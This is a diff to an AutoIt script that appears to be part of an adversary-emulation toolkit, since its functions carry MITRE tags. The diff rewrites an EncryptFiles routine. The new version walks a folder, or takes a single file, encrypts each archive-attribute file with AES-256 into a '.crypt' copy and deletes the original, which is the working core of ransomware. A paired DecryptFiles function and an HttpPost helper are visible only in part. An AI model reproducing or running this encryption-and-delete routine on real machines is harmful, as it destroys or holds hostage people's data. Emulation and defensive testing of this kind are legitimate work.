@@ -377,16 +377,30 @@ Func HttpPost($ip, $tag, $port = "80", $sData = "");DESCRIPTION:Send data over H
 EndFunc
 
 Func EncryptFiles($password,$folder);DESCRIPTION:Encrypt the files in a directory;MITRE:Post-Adversary Device Access
-  ; List all the files in the directory
-	$filePath = _PathFull($folder,@UserProfileDir)
-    Local $files = _FileListToArray($filePath, "*")
-	For $i = 1 To $files[0]
-	   $result = _Crypt_EncryptFile($filePath & "/" & $files[$i],$filePath & "/" & $files[$i] & ".crypt", $password, $CALG_AES_256)
-	   if $result Then
-		 FileDelete($filePath & "/" & $files[$i])
-	   EndIf
-    Next
-EndFunc
+    $path = _PathFull($folder)
+        if FileGetAttrib($path) = "D" Then
+            if FileExists($path) Then
+                if DirGetSize($path) Then
+                    Local $files = _FileListToArray($path, Default, Default, True)
+                    For $i = 1 To $files[0]
+                        if FileGetAttrib($files[$i]) = "A" Then
+                            ConsoleWrite($files[$i] & @CRLF)
+                            $result = _Crypt_EncryptFile($files[$i],$files[$i] & ".crypt", $password, $CALG_AES_256)
+                            if $result Then
+                                FileDelete($files[$i])
+                            EndIf
+                        EndIf
+                    Next
+                EndIf
+            EndIf
+        Else
+            ConsoleWrite($path)
+            $result = _Crypt_EncryptFile($path,$path & ".crypt", $password, $CALG_AES_256)
+                if $result Then
+                    FileDelete($path)
+                EndIf
+        EndIf
+ EndFunc
 
 Func DecryptFiles($password,$folder);DESCRIPTION:Decrypt the files in a directory;MITRE:-
   ; List all the files in the directory
